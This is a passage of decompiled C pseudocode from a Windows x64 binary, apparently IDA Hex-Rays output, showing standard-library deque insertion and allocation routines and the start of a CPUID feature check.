      result = sub_1400684A0(&v71, (__int64)v22, v4);
    }
  }
  return result;
}

//----- (0000000140069930) ----------------------------------------------------
__int64 *__fastcall sub_140069930(__int64 *a1, __int64 a2, unsigned __int64 a3, __int64 **a4)
{
  __int64 *v4; // r13
  unsigned __int64 v5; // r14
  __int64 v6; // r15
  __int64 v7; // rbx
  _QWORD **v8; // rsi
  unsigned __int64 v9; // r15
  unsigned __int64 v10; // r12
  unsigned __int64 v11; // rdi
  unsigned __int64 l; // rdi
  unsigned __int64 m; // r13
  _QWORD *v14; // rax
  __int64 **v15; // rax
  __int64 v16; // r8
  __int64 v17; // rcx
  signed __int64 v18; // rdi
  signed __int64 v19; // rax
  bool v20; // zf
  unsigned __int64 v21; // rdi
  signed __int64 v22; // r12
  void *v23; // rcx
  _QWORD *v24; // rdx
  _QWORD *v25; // rax
  _QWORD *v26; // rax
  _QWORD *v27; // rcx
  _QWORD **v28; // rbx
  _QWORD ***v29; // rdx
  __int64 v30; // rdi
  _QWORD *v31; // rax
  __int64 *result; // rax
  _QWORD *v33; // rax
  __int64 **v34; // rax
  __int64 v35; // r8
  __int64 *****v36; // rax
  __int64 ****v37; // rdx
  __int64 **v38; // rcx
  __int64 ***v39; // r8
  __int64 v40; // rdx
  __int64 v41; // r12
  _QWORD *v42; // rdi
  _QWORD *v43; // rax
  _QWORD *v44; // rdi
  _QWORD *v45; // rax
  __int64 ****v46; // rdx
  _QWORD *v47; // rcx
  __int64 v48; // r9
  __int64 **v49; // rcx
  __int64 v50; // rcx
  unsigned __int64 v51; // r8
  unsigned __int64 j; // r14
  unsigned __int64 k; // rdi
  _QWORD *v54; // rax
  __int64 **v55; // rax
  __int64 v56; // r8
  _QWORD *v57; // rax
  _QWORD *v58; // rcx
  _QWORD **v59; // rbx
  _QWORD ***v60; // rdx
  __int64 v61; // rdi
  _QWORD *v62; // rax
  unsigned __int64 i; // rdi
  _QWORD *v64; // rax
  __int64 **v65; // rax
  __int64 v66; // r8
  __int64 *****v67; // rax
  __int64 ****v68; // rcx
  __int64 **v69; // rbx
  __int64 ***v70; // rdx
  __int64 v71; // rdi
  __int64 v72; // r15
  _QWORD *v73; // r13
  _QWORD *v74; // rax
  _QWORD *v75; // rax
  __int64 *v76; // r9
  __int64 **v77; // rcx
  __int64 **v78; // rdx
  __int64 v79; // r9
  unsigned __int64 v80; // r8
  __int128 v81; // [rsp+20h] [rbp-F8h]
  __int64 ****v82; // [rsp+30h] [rbp-E8h]
  __m128i v83; // [rsp+40h] [rbp-D8h]
  __int64 v84; // [rsp+50h] [rbp-C8h]
  char v85; // [rsp+60h] [rbp-B8h]
  char v86; // [rsp+78h] [rbp-A0h]
  char v87; // [rsp+90h] [rbp-88h]
  char v88; // [rsp+A8h] [rbp-70h]
  __int64 v89; // [rsp+C0h] [rbp-58h]
  char v90; // [rsp+C8h] [rbp-50h]
  __int64 **v91; // [rsp+138h] [rbp+20h]

  v91 = a4;
  v89 = -2i64;
  v4 = (__int64 *)a4;
  v5 = a3;
  v6 = *(_QWORD *)(a2 + 16);
  v7 = (__int64)a1;
  _mm_storeu_si128((__m128i *)&v81, (__m128i)0i64);
  v8 = 0i64;
  v82 = 0i64;
  v9 = v6 - sub_14006A270(a1, &v83)[2];
  v10 = *(_QWORD *)(v7 + 32) - v9;
  if ( v9 >= v10 )
  {
    if ( v10 >= v5 )
    {
      for ( i = 0i64; ; ++i )
      {
        v64 = sub_14006A270((__int64 *)v7, &v85);
        if ( i >= v5 )
          break;
        v65 = (__int64 **)sub_140068800((__int64)v64, &v87, v9 + v10 + i - v5);
        if ( *v65 )
          v66 = **v65;
        else
          v66 = 0i64;
        sub_14006A7D0(
          v7,
          (__int64 *)(*(_QWORD *)(*(_QWORD *)(v66 + 8)
                                + 8 * (((unsigned __int64)v65[2] >> 1) & (*(_QWORD *)(v66 + 16) - 1i64)))
                    + 8 * ((unsigned __int64)v65[2] & 1)));
      }
      v67 = (__int64 *****)sub_140068800((__int64)v64, &v87, v9);
      v68 = *v67;
      v69 = (__int64 **)v81;
      if ( (__int64 ****)v81 != *v67 )
      {
        if ( v68 )
        {
          v70 = *v68;
          if ( *v68 )
          {
            v69 = *v70;
            *(_QWORD *)&v81 = *v70;
          }
        }
      }
      v71 = (__int64)v67[2];
      v82 = v67[2];
      v72 = *v4;
      v73 = sub_140068800((__int64)&v81, &v85, v10);
      v74 = sub_140068800((__int64)&v81, &v87, v10);
      v75 = sub_1400687B0((__int64)v74, &v90, v5);
      _mm_storeu_si128(&v83, (__m128i)0i64);
      if ( v69 && *v69 )
        v83.m128i_i64[0] = **v69;
      v84 = v71;
      sub_140068350(&v86, (__int64)&v83, (__int64)v75, (__int64)v73);
      result = sub_140068800((__int64)&v81, &v85, v5);
      v76 = result;
      v77 = 0i64;
      if ( v69 && *v69 )
        v77 = (__int64 **)**v69;
      *(_QWORD *)&v81 = 0i64;
      v78 = (__int64 **)*result;
      if ( *result )
      {
        result = *v78;
        if ( *v78 )
        {
          result = (__int64 *)*result;
          *(_QWORD *)&v81 = result;
        }
      }
      v79 = v76[2];
      if ( v77 )
      {
        result = *v77;
        if ( *v77 )
        {
          result = (__int64 *)*result;
          if ( result )
            v8 = (_QWORD **)*result;
        }
      }
      v83.m128i_i64[0] = (__int64)v8;
      v83.m128i_i64[1] = v71;
      _mm_store_si128(&v83, v83);
      if ( v71 != v79 )
      {
        v80 = v83.m128i_u64[1];
        do
        {
          result = v8[1];
          *(_QWORD *)(result[((unsigned __int64)v8[2] - 1) & (v80 >> 1)] + 8 * (v80 & 1)) = v72;
          ++v80;
        }
        while ( v80 != v79 );
      }
    }
    else
    {
      for ( j = v5 - v10; j; --j )
        sub_14006A7D0(v7, v4);
      for ( k = 0i64; ; ++k )
      {
        v54 = sub_14006A270((__int64 *)v7, &v85);
        if ( k >= v10 )
          break;
        v55 = (__int64 **)sub_140068800((__int64)v54, &v87, k + v9);
        if ( *v55 )
          v56 = **v55;
        else
          v56 = 0i64;
        sub_14006A7D0(
          v7,
          (__int64 *)(*(_QWORD *)(*(_QWORD *)(v56 + 8)
                                + 8 * (((unsigned __int64)v55[2] >> 1) & (*(_QWORD *)(v56 + 16) - 1i64)))
                    + 8 * ((unsigned __int64)v55[2] & 1)));
      }
      v57 = sub_140068800((__int64)v54, &v87, v9);
      v58 = (_QWORD *)*v57;
      v59 = (_QWORD **)v81;
      if ( (_QWORD)v81 != *v57 )
      {
        if ( v58 )
        {
          v60 = (_QWORD ***)*v58;
          if ( *v58 )
          {
            v59 = *v60;
            *(_QWORD *)&v81 = *v60;
          }
        }
      }
      v61 = v57[2];
      v82 = (__int64 ****)v57[2];
      v62 = sub_140068800((__int64)&v81, &v85, v10);
      _mm_storeu_si128((__m128i *)&v81, (__m128i)0i64);
      if ( v59 && *v59 )
        *(_QWORD *)&v81 = **v59;
      v82 = (__int64 ****)v61;
      result = sub_140068550((_QWORD **)&v81, (__int64)v62, (__int64 **)v4);
    }
  }
  else
  {
    v11 = v5;
    if ( v9 >= v5 )
    {
      while ( 1 )
      {
        v33 = sub_14006A270((__int64 *)v7, &v86);
        if ( !v11 )
          break;
        v34 = (__int64 **)sub_140068800((__int64)v33, &v88, v5 - 1);
        if ( *v34 )
          v35 = **v34;
        else
          v35 = 0i64;
        sub_14006A980(
          v7,
          (__int64 *)(*(_QWORD *)(*(_QWORD *)(v35 + 8)
                                + 8 * (((unsigned __int64)v34[2] >> 1) & (*(_QWORD *)(v35 + 16) - 1i64)))
                    + 8 * ((unsigned __int64)v34[2] & 1)));
        --v11;
      }
      v36 = (__int64 *****)sub_140068800((__int64)v33, &v88, v5);
      v37 = *v36;
      v38 = (__int64 **)v81;
      if ( (__int64 ****)v81 != *v36 )
      {
        if ( v37 )
        {
          v39 = *v37;
          if ( *v37 )
          {
            v38 = *v39;
            *(_QWORD *)&v81 = *v39;
          }
        }
      }
      v40 = (__int64)v36[2];
      v82 = v36[2];
      v41 = *v4;
      _mm_storeu_si128(&v83, (__m128i)0i64);
      if ( v38 && *v38 )
        v83.m128i_i64[0] = **v38;
      v84 = v40;
      v42 = sub_140068800((__int64)&v81, &v86, v9);
      v43 = sub_140068800((__int64)&v81, &v88, v5);
      sub_1400680B0(&v90, (__int64)v43, (__int64)v42, (__int64)&v83);
      v44 = sub_140068800((__int64)&v81, &v90, v9);
      v45 = sub_14006A270((__int64 *)v7, &v87);
      v46 = (__int64 ****)sub_140068800((__int64)v45, &v85, v9);
      *(_QWORD *)&v81 = 0i64;
      if ( *v44 )
      {
        v47 = *(_QWORD **)*v44;
        if ( v47 )
          *(_QWORD *)&v81 = *v47;
      }
      v48 = v44[2];
      result = 0i64;
      if ( *v46 )
      {
        v49 = **v46;
        if ( v49 )
          result = *v49;
      }
      v50 = (__int64)v46[2];
      if ( result )
        v8 = (_QWORD **)*result;
      v83.m128i_i64[0] = (__int64)v8;
      v83.m128i_i64[1] = v50;
      _mm_store_si128(&v83, v83);
      if ( v50 != v48 )
      {
        v51 = v83.m128i_u64[1];
        do
        {
          result = v8[1];
          *(_QWORD *)(result[((unsigned __int64)v8[2] - 1) & (v51 >> 1)] + 8 * (v51 & 1)) = v41;
          ++v51;
        }
        while ( v51 != v48 );
      }
    }
    else
    {
      for ( l = v5 - v9; l; --l )
        sub_14006A980(v7, v4);
      for ( m = v9; m; --m )
      {
        v14 = sub_14006A270((__int64 *)v7, &v88);
        v15 = (__int64 **)sub_140068800((__int64)v14, &v86, v5 - 1);
        if ( *v15 )
          v16 = **v15;
        else
          v16 = 0i64;
        v83.m128i_i64[0] = *(_QWORD *)(*(_QWORD *)(v16 + 8)
                                     + 8 * (((unsigned __int64)v15[2] >> 1) & (*(_QWORD *)(v16 + 16) - 1i64)))
                         + 8 * ((unsigned __int64)v15[2] & 1);
        if ( !(*(_BYTE *)(v7 + 24) & 1) && *(_QWORD *)(v7 + 16) <= (unsigned __int64)(*(_QWORD *)(v7 + 32) + 2i64) >> 1 )
          sub_140069110((_QWORD *)v7, 1ui64);
        v17 = *(_QWORD *)(v7 + 16);
        v18 = 2 * v17;
        v19 = 2 * v17 - 1;
        v20 = (v19 & *(_QWORD *)(v7 + 24)) == 0;
        *(_QWORD *)(v7 + 24) &= v19;
        if ( !v20 )
          v18 = *(_QWORD *)(v7 + 24);
        v21 = v18 - 1;
        v22 = 8 * ((v21 >> 1) & (v17 - 1));
        if ( !*(_QWORD *)(v22 + *(_QWORD *)(v7 + 8)) )
        {
          v23 = operator new(0x10ui64);
          if ( !v23 )
            std::_Xbad_alloc();
          *(_QWORD *)(v22 + *(_QWORD *)(v7 + 8)) = v23;
        }
        v24 = (_QWORD *)(*(_QWORD *)(v22 + *(_QWORD *)(v7 + 8)) + 8 * (v21 & 1));
        if ( v24 )
          *v24 = *(_QWORD *)v83.m128i_i64[0];
        *(_QWORD *)(v7 + 24) = v21;
        ++*(_QWORD *)(v7 + 32);
      }
      v25 = sub_14006A270((__int64 *)v7, &v86);
      v26 = sub_140068800((__int64)v25, &v88, v5);
      v27 = (_QWORD *)*v26;
      v28 = (_QWORD **)v81;
      if ( (_QWORD)v81 != *v26 )
      {
        if ( v27 )
        {
          v29 = (_QWORD ***)*v27;
          if ( *v27 )
          {
            v28 = *v29;
            *(_QWORD *)&v81 = *v29;
          }
        }
      }
      v30 = v26[2];
      v82 = (__int64 ****)v26[2];
      v31 = sub_140068800((__int64)&v81, &v86, v9);
      _mm_storeu_si128((__m128i *)&v81, (__m128i)0i64);
      if ( v28 && *v28 )
        *(_QWORD *)&v81 = **v28;
      v82 = (__int64 ****)v30;
      result = sub_140068550((_QWORD **)&v81, (__int64)v31, v91);
    }
  }
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006A050) ----------------------------------------------------
_QWORD *__fastcall sub_14006A050(_QWORD *a1, _QWORD *a2, __int64 a3)
{
  a2[2] = *(_QWORD *)(a3 + 16);
  *a2 = 0i64;
  a2[1] = 0i64;
  if ( a1 )
    *a2 = *a1;
  return a2;
}

//----- (000000014006A070) ----------------------------------------------------
__int64 *__fastcall sub_14006A070(__int64 *a1, unsigned __int64 a2, unsigned int *a3)
{
  unsigned __int64 v3; // rsi
  unsigned int *v4; // rdi
  __int64 *v5; // rbx
  _QWORD *v6; // rax
  _QWORD **v7; // rcx
  _QWORD *v8; // rcx
  _QWORD *v9; // rax
  _QWORD **v10; // rcx
  _QWORD *v11; // rcx
  _QWORD *v12; // rax
  _QWORD *v13; // rcx
  __int128 v15; // [rsp+20h] [rbp-88h]
  __int64 v16; // [rsp+30h] [rbp-78h]
  __int128 v17; // [rsp+38h] [rbp-70h]
  __int64 v18; // [rsp+48h] [rbp-60h]
  char v19; // [rsp+50h] [rbp-58h]
  char v20; // [rsp+68h] [rbp-40h]
  char v21; // [rsp+80h] [rbp-28h]

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = sub_140070CD0(a1, &v20);
  v7 = (_QWORD **)*v6;
  _mm_storeu_si128((__m128i *)&v17, (__m128i)0i64);
  if ( v7 )
  {
    v8 = *v7;
    if ( v8 )
      *(_QWORD *)&v17 = *v8;
  }
  v18 = v6[2];
  v9 = sub_14006A270(v5, &v21);
  v10 = (_QWORD **)*v9;
  _mm_storeu_si128((__m128i *)&v15, (__m128i)0i64);
  if ( v10 )
  {
    v11 = *v10;
    if ( v11 )
      *(_QWORD *)&v15 = *v11;
  }
  v16 = v9[2];
  sub_14006A290(v5, &v19, (__int64)&v15, (__int64)&v17);
  v12 = sub_14006A270(v5, &v19);
  _mm_storeu_si128((__m128i *)&v15, (__m128i)0i64);
  if ( *v12 )
  {
    v13 = *(_QWORD **)*v12;
    if ( v13 )
      *(_QWORD *)&v15 = *v13;
  }
  v16 = v12[2];
  return sub_1400692C0(v5, (__int64)&v15, v3, v4);
}

//----- (000000014006A170) ----------------------------------------------------
__int64 *__fastcall sub_14006A170(__int64 *a1, unsigned __int64 a2, __int64 **a3)
{
  unsigned __int64 v3; // rsi
  __int64 **v4; // rdi
  __int64 *v5; // rbx
  _QWORD *v6; // rax
  _QWORD **v7; // rcx
  _QWORD *v8; // rcx
  _QWORD *v9; // rax
  _QWORD **v10; // rcx
  _QWORD *v11; // rcx
  _QWORD *v12; // rax
  _QWORD *v13; // rcx
  __int128 v15; // [rsp+20h] [rbp-88h]
  __int64 v16; // [rsp+30h] [rbp-78h]
  __int128 v17; // [rsp+38h] [rbp-70h]
  __int64 v18; // [rsp+48h] [rbp-60h]
  char v19; // [rsp+50h] [rbp-58h]
  char v20; // [rsp+68h] [rbp-40h]
  char v21; // [rsp+80h] [rbp-28h]

  v3 = a2;
  v4 = a3;
  v5 = a1;
  v6 = sub_140070CD0(a1, &v20);
  v7 = (_QWORD **)*v6;
  _mm_storeu_si128((__m128i *)&v17, (__m128i)0i64);
  if ( v7 )
  {
    v8 = *v7;
    if ( v8 )
      *(_QWORD *)&v17 = *v8;
  }
  v18 = v6[2];
  v9 = sub_14006A270(v5, &v21);
  v10 = (_QWORD **)*v9;
  _mm_storeu_si128((__m128i *)&v15, (__m128i)0i64);
  if ( v10 )
  {
    v11 = *v10;
    if ( v11 )
      *(_QWORD *)&v15 = *v11;
  }
  v16 = v9[2];
  sub_14006A4C0(v5, &v19, (__int64)&v15, (__int64)&v17);
  v12 = sub_14006A270(v5, &v19);
  _mm_storeu_si128((__m128i *)&v15, (__m128i)0i64);
  if ( *v12 )
  {
    v13 = *(_QWORD **)*v12;
    if ( v13 )
      *(_QWORD *)&v15 = *v13;
  }
  v16 = v12[2];
  return sub_140069930(v5, (__int64)&v15, v3, v4);
}

//----- (000000014006A270) ----------------------------------------------------
_QWORD *__fastcall sub_14006A270(__int64 *a1, _QWORD *a2)
{
  __int64 v2; // rax
  __int64 v3; // r8

  v2 = *a1;
  v3 = a1[3];
  a2[1] = 0i64;
  *a2 = v2;
  a2[2] = v3;
  return a2;
}

//----- (000000014006A290) ----------------------------------------------------
_QWORD *__fastcall sub_14006A290(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  _QWORD **v4; // rax
  __int64 v5; // rdi
  _QWORD *v6; // r12
  __int64 *v7; // rbx
  _QWORD *v8; // rax
  _QWORD **v9; // rax
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  __int64 v12; // r14
  __int64 v13; // rsi
  unsigned __int64 v14; // r15
  __int64 v15; // rdi
  unsigned __int64 v16; // rcx
  _QWORD **v17; // rax
  _QWORD *v18; // rax
  _QWORD *v19; // rax
  __int64 v20; // rax
  _QWORD *v21; // rax
  _QWORD **v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rax
  __int128 v26; // [rsp+20h] [rbp-60h]
  __int64 v27; // [rsp+30h] [rbp-50h]
  __int128 v28; // [rsp+38h] [rbp-48h]
  __int64 v29; // [rsp+48h] [rbp-38h]
  __int128 v30; // [rsp+50h] [rbp-30h]
  __int64 v31; // [rsp+60h] [rbp-20h]
  char v32; // [rsp+68h] [rbp-18h]

  v4 = *(_QWORD ***)a3;
  v5 = a4;
  v6 = a2;
  v7 = a1;
  _mm_storeu_si128((__m128i *)&v26, (__m128i)0i64);
  if ( v4 )
  {
    v8 = *v4;
    if ( v8 )
      *(_QWORD *)&v26 = *v8;
  }
  v27 = *(_QWORD *)(a3 + 16);
  sub_14006A050(a1, &v30, (__int64)&v26);
  v9 = *(_QWORD ***)v5;
  _mm_storeu_si128((__m128i *)&v26, (__m128i)0i64);
  if ( v9 )
  {
    v10 = *v9;
    if ( v10 )
      *(_QWORD *)&v26 = *v10;
  }
  v27 = *(_QWORD *)(v5 + 16);
  sub_14006A050(v7, &v28, (__int64)&v26);
  v11 = sub_14006A270(v7, &v26);
  v12 = v31;
  v13 = v29;
  v14 = v31 - v11[2];
  v15 = v29 - v31;
  v16 = sub_140070CD0(v7, &v26)[2] - v13;
  _mm_storeu_si128((__m128i *)&v26, (__m128i)0i64);
  if ( v14 >= v16 )
  {
    if ( (_QWORD)v30 && *(_QWORD *)v30 )
      *(_QWORD *)&v26 = **(_QWORD **)v30;
    v27 = v12;
    v21 = sub_140070CD0(v7, &v32);
    v22 = (_QWORD **)v28;
    _mm_storeu_si128((__m128i *)&v30, (__m128i)0i64);
    if ( v22 )
    {
      v23 = *v22;
      if ( v23 )
        *(_QWORD *)&v30 = *v23;
    }
    v31 = v13;
    sub_140067F60(&v28, (__int64)&v30, (__int64)v21, (__int64)&v26);
    if ( v15 )
    {
      v20 = v7[4];
      do
      {
        if ( !--v20 )
          v7[3] = 0i64;
        --v15;
      }
      while ( v15 );
      goto LABEL_32;
    }
  }
  else
  {
    if ( (_QWORD)v28 && *(_QWORD *)v28 )
      *(_QWORD *)&v26 = **(_QWORD **)v28;
    v17 = (_QWORD **)v30;
    v27 = v13;
    _mm_storeu_si128((__m128i *)&v28, (__m128i)0i64);
    if ( v17 )
    {
      v18 = *v17;
      if ( v18 )
        *(_QWORD *)&v28 = *v18;
    }
    v29 = v12;
    v19 = sub_14006A270(v7, &v30);
    sub_140068200(&v32, (__int64)v19, (__int64)&v28, (__int64)&v26);
    if ( v15 )
    {
      v20 = v7[4];
      do
      {
        if ( --v20 )
          ++v7[3];
        else
          v7[3] = 0i64;
        --v15;
      }
      while ( v15 );
LABEL_32:
      v7[4] = v20;
      goto LABEL_33;
    }
  }
LABEL_33:
  v24 = sub_14006A270(v7, &v32);
  sub_140068800((__int64)v24, v6, v14);
  return v6;
}

//----- (000000014006A4C0) ----------------------------------------------------
_QWORD *__fastcall sub_14006A4C0(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  _QWORD **v4; // rax
  __int64 v5; // rdi
  _QWORD *v6; // r12
  __int64 *v7; // rbx
  _QWORD *v8; // rax
  _QWORD **v9; // rax
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  __int64 v12; // r14
  __int64 v13; // rsi
  unsigned __int64 v14; // r15
  __int64 v15; // rdi
  unsigned __int64 v16; // rcx
  _QWORD **v17; // rax
  _QWORD *v18; // rax
  _QWORD *v19; // rax
  __int64 v20; // rax
  _QWORD *v21; // rax
  _QWORD **v22; // rcx
  _QWORD *v23; // rcx
  _QWORD *v24; // rax
  __int128 v26; // [rsp+20h] [rbp-60h]
  __int64 v27; // [rsp+30h] [rbp-50h]
  __int128 v28; // [rsp+38h] [rbp-48h]
  __int64 v29; // [rsp+48h] [rbp-38h]
  __int128 v30; // [rsp+50h] [rbp-30h]
  __int64 v31; // [rsp+60h] [rbp-20h]
  char v32; // [rsp+68h] [rbp-18h]

  v4 = *(_QWORD ***)a3;
  v5 = a4;
  v6 = a2;
  v7 = a1;
  _mm_storeu_si128((__m128i *)&v26, (__m128i)0i64);
  if ( v4 )
  {
    v8 = *v4;
    if ( v8 )
      *(_QWORD *)&v26 = *v8;
  }
  v27 = *(_QWORD *)(a3 + 16);
  sub_14006A050(a1, &v30, (__int64)&v26);
  v9 = *(_QWORD ***)v5;
  _mm_storeu_si128((__m128i *)&v26, (__m128i)0i64);
  if ( v9 )
  {
    v10 = *v9;
    if ( v10 )
      *(_QWORD *)&v26 = *v10;
  }
  v27 = *(_QWORD *)(v5 + 16);
  sub_14006A050(v7, &v28, (__int64)&v26);
  v11 = sub_14006A270(v7, &v26);
  v12 = v31;
  v13 = v29;
  v14 = v31 - v11[2];
  v15 = v29 - v31;
  v16 = sub_140070CD0(v7, &v26)[2] - v13;
  _mm_storeu_si128((__m128i *)&v26, (__m128i)0i64);
  if ( v14 >= v16 )
  {
    if ( (_QWORD)v30 && *(_QWORD *)v30 )
      *(_QWORD *)&v26 = **(_QWORD **)v30;
    v27 = v12;
    v21 = sub_140070CD0(v7, &v32);
    v22 = (_QWORD **)v28;
    _mm_storeu_si128((__m128i *)&v30, (__m128i)0i64);
    if ( v22 )
    {
      v23 = *v22;
      if ( v23 )
        *(_QWORD *)&v30 = *v23;
    }
    v31 = v13;
    sub_1400680B0(&v28, (__int64)&v30, (__int64)v21, (__int64)&v26);
    if ( v15 )
    {
      v20 = v7[4];
      do
      {
        if ( !--v20 )
          v7[3] = 0i64;
        --v15;
      }
      while ( v15 );
      goto LABEL_32;
    }
  }
  else
  {
    if ( (_QWORD)v28 && *(_QWORD *)v28 )
      *(_QWORD *)&v26 = **(_QWORD **)v28;
    v17 = (_QWORD **)v30;
    v27 = v13;
    _mm_storeu_si128((__m128i *)&v28, (__m128i)0i64);
    if ( v17 )
    {
      v18 = *v17;
      if ( v18 )
        *(_QWORD *)&v28 = *v18;
    }
    v29 = v12;
    v19 = sub_14006A270(v7, &v30);
    sub_140068350(&v32, (__int64)v19, (__int64)&v28, (__int64)&v26);
    if ( v15 )
    {
      v20 = v7[4];
      do
      {
        if ( --v20 )
          ++v7[3];
        else
          v7[3] = 0i64;
        --v15;
      }
      while ( v15 );
LABEL_32:
      v7[4] = v20;
      goto LABEL_33;
    }
  }
LABEL_33:
  v24 = sub_14006A270(v7, &v32);
  sub_140068800((__int64)v24, v6, v14);
  return v6;
}

//----- (000000014006A6F0) ----------------------------------------------------
__int64 __fastcall sub_14006A6F0(__int64 a1, unsigned int *a2)
{
  __int64 v2; // rbx
  __int64 v3; // rcx
  unsigned int *v4; // r14
  __int64 v5; // rdx
  unsigned __int64 v6; // rdi
  signed __int64 v7; // rsi
  void *v8; // rcx
  __int64 result; // rax
  _DWORD *v10; // rcx

  v2 = a1;
  v3 = *(_QWORD *)(a1 + 32);
  v4 = a2;
  if ( !((*(_BYTE *)(v2 + 24) + (_BYTE)v3) & 3) && *(_QWORD *)(v2 + 16) <= (unsigned __int64)(v3 + 4) >> 2 )
    sub_140068F60((_QWORD *)v2, 1ui64);
  v5 = *(_QWORD *)(v2 + 16);
  *(_QWORD *)(v2 + 24) &= 4 * v5 - 1;
  v6 = *(_QWORD *)(v2 + 32) + *(_QWORD *)(v2 + 24);
  v7 = 8 * ((v6 >> 2) & (v5 - 1));
  if ( !*(_QWORD *)(v7 + *(_QWORD *)(v2 + 8)) )
  {
    v8 = operator new(0x10ui64);
    if ( !v8 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
    *(_QWORD *)(v7 + *(_QWORD *)(v2 + 8)) = v8;
  }
  result = *(_QWORD *)(*(_QWORD *)(v2 + 8) + v7);
  v10 = (_DWORD *)(result + 4 * (v6 & 3));
  if ( v10 )
  {
    result = *v4;
    *v10 = result;
  }
  ++*(_QWORD *)(v2 + 32);
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006A7D0) ----------------------------------------------------
__int64 __fastcall sub_14006A7D0(__int64 a1, __int64 *a2)
{
  __int64 v2; // rbx
  __int64 v3; // rcx
  __int64 *v4; // r14
  __int64 v5; // rdx
  unsigned __int64 v6; // rdi
  signed __int64 v7; // rsi
  void *v8; // rcx
  __int64 result; // rax
  __int64 *v10; // rcx

  v2 = a1;
  v3 = *(_QWORD *)(a1 + 32);
  v4 = a2;
  if ( !((*(_BYTE *)(v2 + 24) + (_BYTE)v3) & 1) && *(_QWORD *)(v2 + 16) <= (unsigned __int64)(v3 + 2) >> 1 )
    sub_140069110((_QWORD *)v2, 1ui64);
  v5 = *(_QWORD *)(v2 + 16);
  *(_QWORD *)(v2 + 24) &= 2 * v5 - 1;
  v6 = *(_QWORD *)(v2 + 32) + *(_QWORD *)(v2 + 24);
  v7 = 8 * ((v6 >> 1) & (v5 - 1));
  if ( !*(_QWORD *)(v7 + *(_QWORD *)(v2 + 8)) )
  {
    v8 = operator new(0x10ui64);
    if ( !v8 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
    *(_QWORD *)(v7 + *(_QWORD *)(v2 + 8)) = v8;
  }
  result = *(_QWORD *)(*(_QWORD *)(v2 + 8) + v7);
  v10 = (__int64 *)(result + 8 * (v6 & 1));
  if ( v10 )
  {
    result = *v4;
    *v10 = *v4;
  }
  ++*(_QWORD *)(v2 + 32);
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006A8A0) ----------------------------------------------------
__int64 __fastcall sub_14006A8A0(__int64 a1, unsigned int *a2)
{
  unsigned int *v2; // r14
  _QWORD *v3; // rbx
  __int64 v4; // rcx
  signed __int64 v5; // rdi
  signed __int64 v6; // rax
  bool v7; // zf
  unsigned __int64 v8; // rdi
  signed __int64 v9; // rsi
  void *v10; // rcx
  __int64 result; // rax
  _DWORD *v12; // rdx

  v2 = a2;
  v3 = (_QWORD *)a1;
  if ( !(*(_BYTE *)(a1 + 24) & 3) && *(_QWORD *)(a1 + 16) <= (unsigned __int64)(*(_QWORD *)(a1 + 32) + 4i64) >> 2 )
    sub_140068F60((_QWORD *)a1, 1ui64);
  v4 = v3[2];
  v5 = 4 * v4;
  v6 = 4 * v4 - 1;
  v7 = (v6 & v3[3]) == 0;
  v3[3] &= v6;
  if ( !v7 )
    v5 = v3[3];
  v8 = v5 - 1;
  v9 = 8 * ((v8 >> 2) & (v4 - 1));
  if ( !*(_QWORD *)(v9 + v3[1]) )
  {
    v10 = operator new(0x10ui64);
    if ( !v10 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
    *(_QWORD *)(v9 + v3[1]) = v10;
  }
  result = *(_QWORD *)(v3[1] + v9);
  v12 = (_DWORD *)(result + 4 * (v8 & 3));
  if ( v12 )
  {
    result = *v2;
    *v12 = result;
  }
  ++v3[4];
  v3[3] = v8;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006A980) ----------------------------------------------------
__int64 __fastcall sub_14006A980(__int64 a1, __int64 *a2)
{
  __int64 *v2; // r14
  _QWORD *v3; // rbx
  __int64 v4; // rcx
  signed __int64 v5; // rdi
  signed __int64 v6; // rax
  bool v7; // zf
  unsigned __int64 v8; // rdi
  signed __int64 v9; // rsi
  void *v10; // rcx
  __int64 result; // rax
  __int64 *v12; // rdx

  v2 = a2;
  v3 = (_QWORD *)a1;
  if ( !(*(_BYTE *)(a1 + 24) & 1) && *(_QWORD *)(a1 + 16) <= (unsigned __int64)(*(_QWORD *)(a1 + 32) + 2i64) >> 1 )
    sub_140069110((_QWORD *)a1, 1ui64);
  v4 = v3[2];
  v5 = 2 * v4;
  v6 = 2 * v4 - 1;
  v7 = (v6 & v3[3]) == 0;
  v3[3] &= v6;
  if ( !v7 )
    v5 = v3[3];
  v8 = v5 - 1;
  v9 = 8 * ((v8 >> 1) & (v4 - 1));
  if ( !*(_QWORD *)(v9 + v3[1]) )
  {
    v10 = operator new(0x10ui64);
    if ( !v10 )
    {
      std::_Xbad_alloc();
      __debugbreak();
    }
    *(_QWORD *)(v9 + v3[1]) = v10;
  }
  result = *(_QWORD *)(v3[1] + v9);
  v12 = (__int64 *)(result + 8 * (v8 & 1));
  if ( v12 )
  {
    result = *v2;
    *v12 = *v2;
  }
  ++v3[4];
  v3[3] = v8;
  return result;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (000000014006AA50) ----------------------------------------------------
signed __int64 sub_14006AA50()
{
  int v5; // esi
  unsigned int v6; // er15
  int v8; // edi
  int v9; // er14
  unsigned int v14; // er9
  unsigned __int8 v15; // r11^1
  __int16 v16; // r10
  char v17; // al
  int v28; // er8
  signed __int64 result; // rax

  _RAX = 0i64;
  __asm { cpuid }
  v5 = _RCX;
  v6 = _RAX;
  _RAX = 1i64;
  v8 = _RDX;
  v9 = _RBX;
  __asm { cpuid }
  v14 = _RCX;
  v15 = BYTE1(_RBX);
  v16 = _RAX;
  byte_1400DBD4D = ((unsigned int)_RDX >> 23) & 1;
  if ( _bittest((const signed int *)&_RDX, 0x1Au) )
  {
    v17 = 1;
    byte_1400DBD4F = 1;
  }
  else
  {
    v17 = byte_1400DBD4F;
    if ( !byte_1400DBD4F )
    {
LABEL_5:
